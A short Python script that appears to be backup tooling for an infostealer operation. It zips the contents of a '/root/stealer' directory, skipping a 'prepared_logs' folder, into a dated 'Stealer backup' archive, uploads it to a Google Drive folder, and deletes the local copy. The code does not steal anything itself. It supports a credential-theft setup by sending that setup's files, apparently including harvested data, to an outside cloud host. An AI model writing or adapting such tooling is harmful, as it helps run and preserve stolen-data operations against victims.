import os
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
import zipfile
import time

os.chdir("/root/stealer")

backup_name = time.strftime("Stealer backup [%d.%m.%Y].zip")
bad_files = [backup_name, "prepared_logs"]

gauth = GoogleAuth()
drive = GoogleDrive(gauth)

zipObj = zipfile.ZipFile(backup_name, "w")
for folder, subfolders, files in os.walk("."):
    write = True
    for bad_file in bad_files:
        if bad_file in folder:
            write = False
    if not write:
        continue
    for file in files:
        if file in bad_files:
            continue
        zipObj.write(
            os.path.join(folder, file),
            os.path.relpath(os.path.join(folder, file), "."),
            compress_type=zipfile.ZIP_DEFLATED
        )
zipObj.close()

gfile = drive.CreateFile({'parents': [{'id': 'hehehe'}]})
gfile.SetContentFile(backup_name)
gfile.Upload()

os.remove(backup_name)
